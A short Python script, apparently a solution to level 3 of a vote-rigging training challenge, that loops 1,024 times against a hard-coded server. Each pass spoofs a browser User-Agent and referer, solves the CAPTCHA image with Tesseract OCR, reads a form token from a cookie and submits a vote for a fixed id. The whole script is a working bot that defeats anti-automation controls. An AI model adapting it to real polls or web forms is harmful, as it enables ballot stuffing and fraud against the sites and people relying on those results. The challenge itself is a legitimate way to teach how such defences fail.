#!/usr/bin/python3
"""level 3  """

import requests
try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract


def vote():
    url = 'http://158.69.76.135/level3.php'
    captcha_url = 'http://158.69.76.135/captcha.php'
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
    h = {
        "User-Agent": user_agent,
        "referer": url
    }
    id = "4291"
    contador = 1024

    for i in range(contador):
        with requests.Session() as s: 
            r = s.get(url, headers=h)
            i = s.get(captcha_url, headers=h) 
            image_file = open('captcha.png', 'wb') 
            image_file.write(i.content)
            image_file.close()

            captcha_string = pytesseract.image_to_string(Image.open('captcha.png'))
            print(captcha_string, type(captcha_string))
            c = r.cookies
            key_form = ""
            for cookie in c:
                if cookie.name == 'HoldTheDoor':
                    key_form = cookie.value
                    break
            l = s.post(url, data={'id': 867, 'holdthedoor': 'Submit', 'key': key_form, 'captcha': captcha_string}, headers=h, cookies = c)

vote()